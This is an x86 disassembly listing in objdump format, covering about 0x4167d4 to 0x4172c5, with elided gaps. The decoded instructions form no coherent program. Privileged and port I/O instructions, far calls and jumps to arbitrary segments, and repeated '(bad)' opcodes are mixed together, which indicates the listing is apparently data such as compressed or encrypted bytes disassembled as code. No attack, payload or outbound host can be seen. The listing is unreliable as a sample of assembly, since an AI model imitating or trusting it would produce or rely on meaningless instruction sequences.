  4167d4:	sar    DWORD PTR ds:[esi+0x4b31bfd8],1
  4167db:	iret   
  4167dc:	shl    bl,cl
  4167de:	fmul   DWORD PTR [esi-0x4a8c4520]
  4167e4:	aaa    
  4167e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e6:	or     BYTE PTR fs:[ebx],cl
  4167e9:	xchg   ecx,eax
  4167ea:	fucomp st(2)
  4167ec:	jns    0x4167ac
  4167ee:	jae    0x4167e2
  4167f0:	push   es
  4167f1:	push   0xffffffb6
  4167f3:	push   esp
  4167f4:	fldcw  WORD PTR [ebp-0x68]
  4167f7:	call   ebp
  4167f9:	ss dec edi
  4167fb:	cmp    al,0xde
  4167fd:	jmp    0xfb15afa7
  416802:	sub    ecx,esp
  416804:	hlt    
  416805:	xchg   BYTE PTR [edx+esi*2],bl
  416808:	in     al,0x42
  41680a:	pop    edx
  41680b:	mov    DWORD PTR ds:[ebp-0x5a],edx
  41680f:	push   ecx
  416810:	data16 fcmovb st,st(5)
  416813:	inc    esp
  416814:	mov    dh,0x5d
  416816:	ins    BYTE PTR es:[edi],dx
  416817:	inc    ebx
  416818:	outs   dx,DWORD PTR ds:[esi]
  416819:	repz cld 
  41681b:	and    ebx,DWORD PTR [esi-0x6cce1d4a]
  416821:	mov    eax,0xccc87f53
  416826:	dec    ebx
  416827:	cwde   
  416828:	fisttp QWORD PTR [ecx-0x52]
  41682b:	enter  0xcba6,0x5d
  41682f:	cmc    
  416830:	je     0x416846
  416832:	sbb    eax,edi
  416834:	sub    eax,0xc8d53a80
  416839:	imul   eax,edx,0xc9384630
  41683f:	scas   eax,DWORD PTR es:[edi]
  416840:	fistp  WORD PTR [edx+0x72645edf]
  416846:	out    0x24,eax
  416848:	ja     0x416815
  41684a:	lods   eax,DWORD PTR ds:[esi]
  41684b:	pop    ds
  41684c:	jg     0x41683c
  41684e:	aas    
  41684f:	mov    dh,0x40
  416851:	pop    eax
  416852:	add    eax,0x3ecc3e6b
  416857:	ficomp WORD PTR [ebx+0x3d65f9d0]
  41685d:	mov    eax,0x543a5177
  416862:	push   0xffffff99
  416864:	dec    ebx
  416865:	out    dx,eax
  416866:	fisubr WORD PTR [ebx+0x1911b1cb]
  41686c:	sbb    eax,0xffee5f64
  416871:	addr16 addr16 xchg esi,eax
  416874:	pop    esp
  416875:	push   edi
  416876:	outs   dx,DWORD PTR ds:[esi]
  416877:	xchg   BYTE PTR [ecx+0x96a662],dl
  41687d:	ins    DWORD PTR es:[edi],dx
  41687e:	jge    0x4168ae
  416880:	shl    bl,cl
  416882:	(bad)  
  416883:	not    BYTE PTR [ebx+0x7d85b887]
  416889:	push   ss
  41688a:	jno    0x41685e
  41688c:	lds    ecx,FWORD PTR ds:0x78ad44e1
  416892:	add    BYTE PTR [edi],ah
  416894:	fadd   QWORD PTR [ecx]
  416896:	pop    ebp
  416897:	mov    ah,0x40
  416899:	lea    esp,[eax]
  41689b:	dec    edi
  41689c:	inc    ecx
  41689d:	pop    edx
  41689e:	icebp  
  41689f:	pop    edx
  4168a0:	dec    eax
  4168a1:	mov    al,ds:0x2bfa12c2
  4168a6:	addr16 pop ebp
  4168a8:	adc    eax,0x4dc7ece2
  4168ad:	xchg   ecx,eax
  4168ae:	mov    esi,esi
  4168b0:	cmp    BYTE PTR [ecx],bh
  4168b2:	call   0x5357:0x697e31e
  4168b9:	jno    0x416897
  4168bb:	dec    ebx
  4168bc:	shl    DWORD PTR [eax-0x1adcb343],1
	...
  416932:	add    BYTE PTR [eax],al
  416934:	inc    ebp
  416935:	mov    BYTE PTR [edi+esi*2],ch
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    edi,esi
  416941:	addr16 inc edi
  416943:	sbb    eax,0xfffffff6
  416946:	add    BYTE PTR [eax],al
  416948:	test   BYTE PTR [eax],0x0
  41694b:	add    BYTE PTR [esi+0x47],al
  41694e:	shl    dh,1
  416950:	lea    ebx,[eax]
  416952:	push   es
  416953:	xchg   ebx,eax
  416954:	cmp    eax,0x612a09e3
  416959:	mov    al,ds:0xff9386b9
  41695e:	lods   al,BYTE PTR ds:[esi]
  41695f:	int3   
  416960:	fld    DWORD PTR [edi]
  416962:	arpl   WORD PTR [ecx+0x7bec231d],si
  416968:	mov    al,ds:0x772f2edf
  41696d:	pop    edi
  41696e:	arpl   WORD PTR [ebp+0x41b7cbc0],di
  416974:	retf   
  416975:	addr16 out 0x41,eax
  416978:	lods   al,BYTE PTR ds:[esi]
  416979:	mov    ebx,0xb926610e
  41697e:	jbe    0x416947
  416980:	push   edi
  416981:	std    
  416982:	adc    edx,edi
  416984:	cwde   
  416985:	div    BYTE PTR [edi-0x57]
  416988:	sbb    al,ch
  41698a:	adc    al,0xea
  41698c:	xor    DWORD PTR [esi+0x75],esi
  41698f:	pop    es
  416990:	inc    eax
  416991:	sub    cl,BYTE PTR [ebx]
  416993:	inc    esi
  416994:	sti    
  416995:	ror    DWORD PTR [ecx+0x11],0x6a
  416999:	lea    esp,[ecx-0x13]
  41699c:	jle    0x416965
  41699e:	ret    
  41699f:	test   BYTE PTR ds:0xea1d8ad6,cl
  4169a5:	out    dx,eax
  4169a6:	shl    BYTE PTR [ebp+0x572f3dc6],0xdd
  4169ad:	xor    al,0xba
  4169af:	stc    
  4169b0:	fld    DWORD PTR [esi+0x213d49ca]
  4169b6:	xchg   edi,eax
  4169b7:	lds    ebx,FWORD PTR [bx]
  4169ba:	nop
  4169bb:	fwait
  4169bc:	mov    bh,0xac
  4169be:	sub    al,0x2b
  4169c0:	mov    al,0x95
  4169c2:	adc    ebx,DWORD PTR [ecx+eax*1-0x38323d36]
  4169c9:	cmp    BYTE PTR [ebp-0x157d33df],ch
  4169cf:	sub    eax,ecx
  4169d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d2:	(bad)
  4169d6:	mov    ebx,0xc9b86fc
  4169db:	ja     0x41695e
  4169dd:	adc    edi,DWORD PTR [ebx+0x49]
  4169e0:	and    dl,ah
  4169e2:	sub    bh,BYTE PTR [eax+0x423a955b]
  4169e8:	mov    cl,BYTE PTR [ecx+0x39]
  4169eb:	retf   0xe23a
  4169ee:	clc    
  4169ef:	and    al,BYTE PTR [esi+0x65]
  4169f2:	dec    ebx
  4169f3:	push   esi
  4169f4:	sub    dl,BYTE PTR [eax]
  4169f6:	sub    dl,BYTE PTR [ecx]
  4169f8:	pop    edi
  4169f9:	xor    ebp,ecx
  4169fb:	sub    al,0x8c
  4169fd:	fcomp  DWORD PTR ds:[ecx-0x2106f7ed]
  416a04:	fwait
  416a05:	ja     0x4169dc
  416a07:	retf   0xcc85
  416a0a:	mov    ds:0xdac49807,eax
  416a0f:	jmp    0x4169c0
  416a11:	test   BYTE PTR [eax],dh
  416a13:	loope  0x416a70
  416a15:	pop    ebp
  416a16:	jnp    0x416a5e
  416a18:	and    eax,DWORD PTR [edx-0x60]
  416a1b:	jae    0x4169fd
  416a1d:	or     ah,bl
  416a1f:	sbb    eax,0x3a883dbe
  416a24:	mov    BYTE PTR [esi+0x48fa64b9],ch
  416a2a:	sbb    DWORD PTR [edi],esp
  416a2c:	retf   
  416a2d:	call   0xebc1e847
  416a32:	and    al,0x50
  416a34:	shr    BYTE PTR [ebp+0x60a17d04],0x3
  416a3b:	loope  0x416a2b
  416a3d:	add    cl,BYTE PTR [ebp+0x59]
  416a40:	mov    al,ds:0x6d
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx-0x28939fae]
  416ac3:	loope  0x416a93
  416ac5:	test   DWORD PTR [eax],0xf600
  416acb:	add    BYTE PTR [esp+0x72],ah
  416acf:	ins    DWORD PTR es:[edi],dx
  416ad0:	arpl   WORD PTR [edx+ecx*4+0x6c948a12],sp
  416ad7:	les    esi,FWORD PTR ds:0xa8fef017
  416add:	jle    0x416ad6
  416adf:	mov    al,ds:0x84ba579f
  416ae4:	add    eax,DWORD PTR [edx+0x2b943c1e]
  416aea:	repnz test eax,0xa3815e7d
  416af0:	mov    al,ds:0xafa025f
  416af5:	ficom  DWORD PTR [ebx+0x31e67500]
  416afb:	mov    bl,bl
  416afd:	repnz sub dh,BYTE PTR [esi]
  416b00:	xor    DWORD PTR [ebp-0x7b5b4a19],esi
  416b06:	jb     0x416b50
  416b08:	xchg   ebp,eax
  416b09:	pop    eax
  416b0a:	jp     0x416b6b
  416b0c:	loope  0x416b4b
  416b0e:	mov    dl,0xe4
  416b10:	sub    ah,al
  416b12:	neg    edx
  416b14:	test   DWORD PTR [esi],eax
  416b16:	jp     0x416adb
  416b18:	pop    edi
  416b19:	aam    0x8a
  416b1b:	ret    0x27cb
  416b1e:	test   eax,0x88a9aea4
  416b23:	mov    edx,0xd004a127
  416b28:	shr    edx,0xa
  416b2b:	sbb    eax,0x2f7671c4
  416b30:	jecxz  0x416b85
  416b32:	mov    ch,0x6d
  416b34:	mov    ecx,0x5c39497
  416b39:	(bad)  
  416b3a:	mov    ecx,ecx
  416b3c:	addr16 and al,0x22
  416b3f:	fcmove st,st(4)
  416b41:	mov    ecx,0x8de6e25c
  416b46:	mov    dh,0xe3
  416b48:	call   0x9a73:0xbd0bc5f6
  416b4f:	add    eax,0x8f2f89f
  416b54:	pushf  
  416b55:	scas   al,BYTE PTR es:[edi]
  416b56:	rcr    DWORD PTR [ebx+0x55],0xcb
  416b5a:	js     0x416b9e
  416b5c:	pop    esp
  416b5d:	lahf   
  416b5e:	xor    eax,0xe67be54f
  416b63:	out    0xa4,al
  416b65:	loope  0x416bb2
  416b67:	aas    
  416b68:	jne    0x416b8d
  416b6a:	mov    ds:0x2ea36b4,eax
  416b6f:	mov    ?,WORD PTR [esi+0x4a]
  416b72:	jbe    0x416ba3
  416b74:	ret    
  416b75:	hlt    
  416b76:	sub    ecx,DWORD PTR ds:0x7b2ccb3f
  416b7c:	pop    edi
  416b7d:	inc    eax
  416b7e:	or     BYTE PTR [eax],dh
  416b80:	xchg   edx,eax
  416b81:	bnd jmp 0x98ef83a3
  416b87:	mov    bh,0xca
  416b89:	dec    esi
  416b8a:	ret    
  416b8b:	dec    eax
  416b8c:	iret   
  416b8d:	xchg   ecx,eax
  416b8e:	cmp    ebx,DWORD PTR [edi+0x26ab2aad]
  416b94:	xlat   BYTE PTR ds:[ebx]
  416b95:	add    al,0x84
  416b97:	or     eax,0x13f71375
  416b9c:	neg    ch
  416b9e:	jmp    0xef2d2e17
  416ba3:	push   esi
  416ba4:	cmp    ecx,DWORD PTR [esi-0x3c]
  416ba7:	sub    edi,edi
  416ba9:	out    0xa0,al
  416bab:	xor    esi,DWORD PTR [eax]
  416bad:	xchg   ebx,eax
  416bae:	int    0x54
  416bb0:	out    dx,eax
  416bb1:	in     al,dx
  416bb2:	inc    ecx
  416bb3:	sbb    eax,0xe601b38d
  416bb8:	call   0x5b99a033
  416bbd:	xchg   esp,eax
  416bbe:	repz jb 0x416bd2
  416bc1:	inc    ecx
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    eax,DWORD PTR [ebp-0x78]
  416c42:	ja     0x416c93
  416c44:	(bad)  
  416c45:	clc    
  416c46:	add    BYTE PTR [eax],al
  416c48:	test   BYTE PTR [eax],0x0
  416c4b:	add    BYTE PTR [eax],cl
  416c4d:	mov    al,0x5e
  416c4f:	imul   esi,DWORD PTR [edx+0x65],0x308955f2
  416c56:	fsubr  st(2),st
  416c58:	test   eax,0x7ec123d0
  416c5d:	sub    eax,0x19c0ed90
  416c62:	mov    bh,0x4c
  416c64:	pop    esi
  416c65:	sub    BYTE PTR [edx-0x54],ah
  416c68:	test   eax,0x689b95c1
  416c6d:	daa    
  416c6e:	in     eax,0x4
  416c70:	repz pop ds
  416c72:	gs (bad) 
  416c74:	sahf   
  416c75:	test   BYTE PTR [ecx],ah
  416c77:	icebp  
  416c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c79:	sbb    BYTE PTR [edx-0x4c],bh
  416c7c:	inc    ecx
  416c7d:	push   0x48bf1aef
  416c82:	xchg   ecx,eax
  416c83:	sbb    DWORD PTR [esi],edi
  416c85:	mov    esi,0x7bf4783b
  416c8a:	adc    dh,BYTE PTR [ebp+0x10]
  416c8d:	fst    QWORD PTR [ebx]
  416c8f:	popa   
  416c90:	mov    BYTE PTR [eax],bl
  416c92:	js     0x416ca1
  416c94:	push   0xc0335403
  416c99:	mov    eax,0xc30e3eba
  416c9e:	or     edi,edi
  416ca0:	rcr    ah,0x92
  416ca3:	retf   0xafc7
  416ca6:	sti    
  416ca7:	inc    edi
  416ca8:	bound  esp,QWORD PTR [eax+0x9a68e12]
  416cae:	sub    esp,DWORD PTR [edx-0x4b]
  416cb1:	cs popa 
  416cb3:	gs ds and ebp,edx
  416cb7:	scas   eax,DWORD PTR es:[edi]
  416cb8:	add    DWORD PTR [edx+0x332e85ec],edx
  416cbe:	mov    ds:0xfbb3097,al
  416cc3:	sub    cl,BYTE PTR [edx]
  416cc5:	xchg   edx,eax
  416cc6:	call   0x5ded:0x727ddd69
  416ccd:	fistp  QWORD PTR ds:0x258c0261
  416cd3:	mov    eax,0xfa8f08c9
  416cd8:	sbb    al,0xb6
  416cda:	xor    al,0x91
  416cdc:	jle    0x416c81
  416cde:	jo     0x416cbe
  416ce0:	xchg   ecx,eax
  416ce1:	xchg   ebp,eax
  416ce2:	push   cs
  416ce3:	pop    eax
  416ce4:	jo     0x416d3c
  416ce6:	hlt    
  416ce7:	sub    BYTE PTR [edx-0x15],0x69
  416ceb:	inc    ebx
  416cec:	add    al,0x57
  416cee:	into   
  416cef:	xor    edx,ebx
  416cf1:	mov    cl,0x6e
  416cf3:	xchg   edx,eax
  416cf4:	pop    edx
  416cf5:	shl    BYTE PTR [esi+0x29],cl
  416cf8:	test   ah,al
  416cfa:	lea    ebx,ds:0x5443c477
  416d00:	int3   
  416d01:	pop    es
  416d02:	or     eax,0xc17f5af
  416d07:	push   esp
  416d08:	add    eax,0x95c0d48e
  416d0d:	adc    eax,DWORD PTR [esi+eiz*8-0x6eb38d0b]
  416d14:	add    DWORD PTR [eax-0x4a],ebp
  416d17:	cmp    eax,0x14429c73
  416d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d1d:	sbb    sp,bx
  416d20:	adc    ecx,edi
  416d22:	xchg   esi,edx
  416d24:	inc    esi
  416d25:	mov    eax,0xed9253ac
  416d2a:	fmulp  st(0),st
  416d2c:	or     edi,esp
  416d2e:	jmp    0x8ec3:0xbd33035d
  416d35:	ja     0x416cd3
  416d37:	dec    esi
  416d38:	add    eax,0x103ec90
  416d3d:	iret   
  416d3e:	and    dh,BYTE PTR [ecx]
  416d40:	test   al,0x64
	...
  416db2:	add    BYTE PTR [eax],al
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0x972f9973
  416dc4:	mov    edx,0xf60000f9
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    ch,cl
  416dcd:	je     0x416db1
  416dcf:	dec    ebx
  416dd0:	das    
  416dd1:	pop    edi
  416dd2:	pop    es
  416dd3:	xchg   ebx,eax
  416dd4:	not    BYTE PTR [ecx]
  416dd6:	push   edx
  416dd7:	push   edi
  416dd8:	fdiv   DWORD PTR [ebx+0x20b94fc9]
  416dde:	sub    al,0x31
  416de0:	lds    ebx,FWORD PTR [ebx-0x31]
  416de3:	(bad)  
  416de4:	je     0x416e31
  416de6:	jmp    0x1845e1c6
  416deb:	enter  0x29e0,0xd4
  416def:	jmp    0x5c19edb1
  416df4:	add    eax,esp
  416df6:	pop    es
  416df7:	push   edx
  416df8:	add    ebx,edi
  416dfa:	sbb    al,0xbf
  416dfc:	and    DWORD PTR [esi+esi*1],ebp
  416dff:	xor    bh,BYTE PTR [ebx]
  416e01:	(bad)  
  416e02:	std    
  416e03:	adc    al,0x22
  416e05:	inc    edx
  416e06:	add    DWORD PTR [eax],ebp
  416e08:	inc    edx
  416e09:	cwde   
  416e0a:	cli    
  416e0b:	scas   eax,DWORD PTR es:[edi]
  416e0c:	mov    ch,0x6c
  416e0e:	dec    edi
  416e0f:	xor    al,0x85
  416e11:	jge    0x416e07
  416e13:	cmp    DWORD PTR [esi],0x5a2755a0
  416e19:	jle    0x416ded
  416e1b:	scas   eax,DWORD PTR es:[edi]
  416e1c:	mov    bh,0x79
  416e1e:	nop
  416e1f:	ffree  st(6)
  416e21:	pop    edi
  416e22:	fdiv   DWORD PTR [eax-0x1c0889f]
  416e28:	push   edx
  416e29:	out    0x26,eax
  416e2b:	cdq    
  416e2c:	xchg   edx,eax
  416e2d:	neg    edx
  416e2f:	dec    ecx
  416e30:	push   eax
  416e31:	scas   eax,DWORD PTR es:[edi]
  416e32:	mov    ebx,0xc2391577
  416e37:	jo     0x416eb5
  416e39:	mov    WORD PTR [ecx],?
  416e3b:	and    ebp,eax
  416e3d:	pop    edx
  416e3e:	adc    BYTE PTR [eax+0x7a],bl
  416e41:	inc    esp
  416e42:	scas   eax,DWORD PTR es:[edi]
  416e43:	call   0xedc5cf27
  416e48:	inc    edi
  416e49:	adc    BYTE PTR [esi-0x3c9651b3],0xc
  416e50:	pop    esp
  416e51:	jae    0x416ea7
  416e53:	gs out 0x41,eax
  416e56:	xchg   edi,eax
  416e57:	push   ss
  416e58:	stos   BYTE PTR es:[edi],al
  416e59:	jns    0x416e73
  416e5b:	repz out dx,eax
  416e5d:	sbb    al,BYTE PTR [edx+eiz*1]
  416e60:	xchg   ebx,eax
  416e61:	jg     0x416de4
  416e63:	adc    eax,0x710e8521
  416e68:	mov    ebp,0xf10fcbc
  416e6d:	push   0x2dd8ddf1
  416e72:	in     eax,0x10
  416e74:	scas   eax,DWORD PTR es:[edi]
  416e75:	mov    dh,0x94
  416e77:	inc    edi
  416e78:	cmp    dh,al
  416e7a:	mov    al,ds:0xacb80b44
  416e7f:	jo     0x416e99
  416e81:	sti    
  416e82:	dec    edi
  416e83:	push   ss
  416e84:	xchg   ebx,eax
  416e85:	inc    ecx
  416e86:	dec    edi
  416e87:	add    esi,DWORD PTR [esi-0x26]
  416e8a:	jecxz  0x416e90
  416e8c:	add    al,0x31
  416e8e:	lods   al,BYTE PTR ds:[esi]
  416e8f:	inc    ecx
  416e90:	test   al,0x16
  416e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e93:	pop    ebx
  416e94:	(bad)  
  416e95:	sub    cl,BYTE PTR [ebx]
  416e97:	mov    bl,bl
  416e99:	rcl    DWORD PTR [edi+0x48],cl
  416e9c:	int3   
  416e9d:	mov    DWORD PTR [ecx+0x28],esi
  416ea0:	dec    esi
  416ea1:	sub    edx,DWORD PTR [edx]
  416ea3:	and    eax,0x3676d63
  416ea8:	xchg   ebp,eax
  416ea9:	test   eax,0x84e90d59
  416eae:	sub    ebx,DWORD PTR [edx]
  416eb0:	mov    ch,0xef
  416eb2:	call   0x34ed:0xa21745c5
  416eb9:	ret    0x29f2
  416ebc:	shl    dh,1
  416ebe:	push   ebx
  416ebf:	pop    esp
  416ec0:	repz jmp 0x416ec3
	...
  416f33:	add    BYTE PTR [edi],dl
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	sbb    eax,0xb0e7cabe
  416f45:	cli    
  416f46:	add    BYTE PTR [eax],al
  416f48:	test   BYTE PTR [eax],0x0
  416f4b:	add    dh,ah
  416f4d:	adc    ebp,DWORD PTR [ebp-0x13]
  416f50:	ror    BYTE PTR [edx-0x5],1
  416f53:	inc    ch
  416f55:	adc    BYTE PTR [ebp+0x4e95f8e5],dh
  416f5b:	(bad)  
  416f5c:	imul   DWORD PTR [ebx]
  416f5e:	xchg   ebx,eax
  416f5f:	fiadd  DWORD PTR [edx+0x49]
  416f62:	dec    eax
  416f63:	aas    
  416f64:	int    0xac
  416f66:	mov    edi,0x5b2642ce
  416f6b:	cdq    
  416f6c:	faddp  st(1),st
  416f6e:	fmul   st(1),st
  416f70:	mov    ebx,ecx
  416f72:	ret    
  416f73:	int3   
  416f74:	pop    edi
  416f75:	cmp    DWORD PTR [edi],ebx
  416f77:	dec    ecx
  416f78:	xchg   esp,eax
  416f79:	mov    eax,0x551ec12e
  416f7e:	xor    eax,0x39f28a82
  416f83:	adc    ecx,DWORD PTR [eax+0x50]
  416f86:	das    
  416f87:	lock fnstenv [edx-0x2b]
  416f8b:	mov    eax,0x5d54ba29
  416f90:	jno    0x416feb
  416f92:	mov    ecx,DWORD PTR [edx-0x7e55755d]
  416f98:	adc    DWORD PTR [edi+edx*1+0x63cc60e4],ecx
  416f9f:	fcomp  DWORD PTR [edi-0x55]
  416fa2:	jmp    0x2901:0xd0dd6e16
  416fa9:	mov    dl,0x3
  416fab:	push   ebx
  416fac:	loope  0x416fbb
  416fae:	(bad)  
  416faf:	js     0x416f78
  416fb1:	loope  0x416fe4
  416fb3:	adc    ah,BYTE PTR [ebx+0x3ee6382e]
  416fb9:	in     eax,0x7
  416fbb:	inc    ebp
  416fbc:	push   ds
  416fbd:	add    dl,ch
  416fbf:	jecxz  0x416fe8
  416fc1:	xchg   ecx,eax
  416fc2:	inc    ecx
  416fc3:	dec    BYTE PTR [esi-0x39b1ad8c]
  416fc9:	cmp    cl,ch
  416fcb:	in     eax,0x9a
  416fcd:	xor    esp,ebx
  416fcf:	pop    ebp
  416fd0:	dec    esi
  416fd1:	mov    ds:0xb543dc13,al
  416fd6:	xlat   BYTE PTR ds:[ebx]
  416fd7:	sbb    cl,0xb
  416fda:	sbb    ebx,edx
  416fdc:	inc    edx
  416fdd:	cdq    
  416fde:	cmp    BYTE PTR [ecx+0x55],cl
  416fe1:	or     al,0xcf
  416fe3:	sub    al,0xeb
  416fe5:	sub    BYTE PTR [edi],dh
  416fe7:	lock cmp DWORD PTR [eax],0xc1a9d31
  416fee:	out    dx,eax
  416fef:	or     BYTE PTR [eax+0x3c2843ad],cl
  416ff5:	and    BYTE PTR [edx+0x4a],cl
  416ff8:	push   0x4a
  416ffa:	jns    0x416faf
  416ffc:	ror    BYTE PTR [ecx-0x423b92af],1
  417002:	or     edi,DWORD PTR [edi+0x25f5de7a]
  417008:	stc    
  417009:	xor    al,0x70
  41700b:	imul   esp,ebp,0x2a
  41700e:	jne    0x417001
  417010:	xor    al,0xd8
  417012:	repz repnz retf 
  417015:	and    DWORD PTR [esi-0x52f60683],edi
  41701b:	dec    esp
  41701c:	js     0x417006
  41701e:	jp     0x417050
  417020:	cwde   
  417021:	retf   0xc0e0
  417024:	jl     0x41701f
  417026:	inc    ebp
  417027:	dec    esp
  417028:	push   ecx
  417029:	ficom  WORD PTR [edx+0xe4e8b7e]
  41702f:	leave  
  417030:	lahf   
  417031:	jb     0x417000
  417033:	sub    DWORD PTR [eax-0x1a],ecx
  417036:	adc    DWORD PTR [edi+0x51],eax
  417039:	pop    ecx
  41703a:	jp     0x417054
  41703c:	sub    DWORD PTR [edx-0x14a6645a],ebx
	...
  4170b2:	add    BYTE PTR [eax],al
  4170b4:	and    cl,ch
  4170b6:	cmp    ebx,esi
  4170b8:	sti    
  4170b9:	fsubrp st(5),st
  4170bb:	dec    DWORD PTR [ecx+0x49]
  4170be:	ret    
  4170bf:	sbb    DWORD PTR [edi],0x57
  4170c2:	retf   0xa615
  4170c5:	sti    
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	test   BYTE PTR [eax],0x0
  4170cb:	add    BYTE PTR [ebx+0x46b70ae7],bh
  4170d1:	std    
  4170d2:	out    0x55,al
  4170d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d5:	outs   dx,BYTE PTR ds:[esi]
  4170d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170d7:	cld    
  4170d8:	dec    edx
  4170d9:	jmp    0xf2f3:0x8f080404
  4170e0:	frstor ds:[esi-0x35d8e90d]
  4170e7:	leave  
  4170e8:	inc    esp
  4170e9:	pop    edi
  4170ea:	in     eax,dx
  4170eb:	xor    eax,0x4e1aa2c
  4170f0:	fist   WORD PTR [ebx]
  4170f2:	into   
  4170f3:	jge    0x4170f7
  4170f5:	dec    ebx
  4170f6:	scas   eax,DWORD PTR es:[edi]
  4170f7:	int3   
  4170f8:	(bad)  
  4170fa:	xlat   BYTE PTR ds:[ebx]
  4170fb:	xchg   ebx,eax
  4170fc:	sub    eax,0xf7a90b56
  417101:	cwde   
  417102:	arpl   WORD PTR cs:[esi+0x50],bp
  417106:	into   
  417107:	sbb    DWORD PTR [esi],eax
  417109:	jl     0x41710d
  41710b:	int    0x6e
  41710d:	sub    al,0x50
  41710f:	jnp    0x417188
  417111:	sub    ecx,DWORD PTR [esi]
  417113:	jo     0x4170dc
  417115:	(bad)  
  417116:	mov    edi,0xf476c2b2
  41711b:	mov    ds:0xa0f09e94,al
  417120:	xchg   ebx,eax
  417121:	xchg   BYTE PTR gs:[esi+0x59525216],ch
  417128:	jnp    0x4170c1
  41712a:	xchg   cl,ch
  41712c:	stos   DWORD PTR es:[edi],eax
  41712d:	sbb    bl,dh
  41712f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417130:	xor    cl,dh
  417132:	ret    
  417133:	xor    BYTE PTR [edi-0x59],ah
  417136:	cmp    edi,esp
  417138:	aaa    
  417139:	and    bl,0x43
  41713c:	ss cld 
  41713e:	mov    ch,0x43
  417140:	sar    BYTE PTR [edx-0x4a],0x5d
  417144:	sbb    eax,0x56c401c
  417149:	js     0x417139
  41714b:	dec    ecx
  41714c:	and    al,0x40
  41714e:	mov    cl,0xe5
  417150:	cmp    DWORD PTR [edi+0x76],esp
  417153:	sar    BYTE PTR [ecx+0x1ae75caf],cl
  417159:	repnz or BYTE PTR [eax-0x2be42759],dh
  417160:	jne    0x4171d0
  417162:	push   es
  417163:	adc    eax,0x3d7572a4
  417168:	xor    eax,0xf49e5b05
  41716d:	imul   esp,DWORD PTR [edi+esi*1-0x4e],0x5bdc062e
  417175:	sbb    DWORD PTR [esi],0xffffffb8
  417178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417179:	sti    
  41717a:	fild   QWORD PTR [ebx-0x66]
  41717d:	jno    0x41715c
  41717f:	cmp    ch,BYTE PTR [ebx-0x2]
  417182:	sahf   
  417183:	fstp   TBYTE PTR [ebp+0x2]
  417186:	fucompp 
  417188:	out    dx,al
  417189:	ds js  0x41717b
  41718c:	call   0xd2f27518
  417191:	pusha  
  417192:	mov    ds:0x68e88e9e,al
  417197:	in     al,0x73
  417199:	fisubr DWORD PTR [ecx-0xa]
  41719c:	add    BYTE PTR [edx+ebx*2+0x18c62eee],dh
  4171a3:	cwde   
  4171a4:	stos   DWORD PTR es:[edi],eax
  4171a5:	int3   
  4171a6:	lea    esi,[ebp+0x5374e2a4]
  4171ac:	out    0x40,al
  4171ae:	cld    
  4171af:	shl    ch,1
  4171b1:	mov    edi,0x925c8e9f
  4171b6:	call   0xe072469a
  4171bb:	and    ah,BYTE PTR [eax+0x4ced574a]
  4171c1:	cmc    
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 bnd jae 0x4171cd
  417243:	out    0x9c,al
  417245:	cld    
  417246:	add    BYTE PTR [eax],al
  417248:	test   BYTE PTR [eax],0x0
  41724b:	add    ah,ch
  41724d:	pop    eax
  41724e:	xor    eax,0x87c8cc66
  417253:	test   eax,0xf30e9836
  417258:	mov    edi,?
  41725a:	push   edi
  41725b:	aas    
  41725c:	mov    WORD PTR [edx-0x1e97c0a],ss
  417262:	mov    dh,0x96
  417264:	into   
  417265:	jnp    0x417205
  417267:	adc    esi,0x127b5b1a
  41726d:	nop
  41726e:	adc    BYTE PTR [ebx-0x64288cbd],ch
  417274:	jo     0x4172a4
  417276:	cmp    al,0x1c
  417278:	pop    edi
  417279:	or     eax,0xe020a585
  41727e:	retf   
  41727f:	xor    al,0x53
  417281:	inc    esp
  417282:	inc    ebp
  417283:	nop
  417284:	inc    edi
  417285:	inc    esi
  417286:	dec    eax
  417287:	mov    edx,0xa669c225
  41728c:	pop    edx
  41728d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41728e:	xlat   BYTE PTR ds:[ebx]
  41728f:	inc    edx
  417290:	pop    ds
  417291:	or     ecx,0x809ccaf7
  417297:	jg     0x417247
  417299:	and    DWORD PTR [eax-0x749f3388],esi
  41729f:	sbb    al,0xbc
  4172a1:	adc    al,BYTE PTR [ecx-0x10cd6d53]
  4172a7:	xor    dh,BYTE PTR [edi+eiz*2-0x2a841c10]
  4172ae:	xchg   al,bl
  4172b0:	or     edi,DWORD PTR [eax-0x68]
  4172b3:	scas   al,BYTE PTR es:[edi]
  4172b4:	popa   
  4172b5:	mov    bh,0xc2
  4172b7:	in     al,dx
  4172b8:	retf   0x9dd
  4172bb:	sub    eax,0x645798d8
  4172c0:	ficom  WORD PTR ss:[edi]
  4172c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c4:	dec    eax
  4172c5:	sbb    al,0xb7
